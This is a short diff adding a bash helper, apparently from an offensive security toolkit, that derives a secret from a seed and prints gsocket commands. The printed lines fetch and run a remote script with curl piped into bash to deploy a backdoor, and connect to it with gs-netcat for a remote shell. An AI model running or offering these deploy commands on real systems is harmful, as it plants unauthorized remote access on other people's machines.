@@ -1,0 +1,15 @@
+#! /usr/bin/env bash
+
+{ [[ -n $SF_BINDIR ]] && source "${SF_BINDIR}/funcs.sh"; } || source "/sf/bin/funcs.sh"
+
+gssec() {
+    [[ -z $GS_SEED ]] && { echo -e >&2 "${CY}ERROR${CN}: Please first set: ${CDC}GS_SEED=MySuperStrongMasterSeed${CN}"; return 255; }
+    str="$(echo "${GS_SEED:?}$1" | sha512sum | base64 | tr -d -c a-z0-9)"
+    str="${str:0:22}"
+    [[ ! -t 1 ]] && { echo "${str}"; return; }
+    echo -e "DEPLOY: ${CM}X=${str}"' bash -c "$(curl -fsSL https://gsocket.io/x)"'"${CN}"
+    echo -e "ACCESS: ${CM}S=${str}"' bash -c "$(curl -fsSL https://gsocket.io/x)"'"${CN}"
+    echo -e "ACCESS: ${CM}gs-netcat -s ${str} -i${CN}"
+}
+
+gssec "$@"
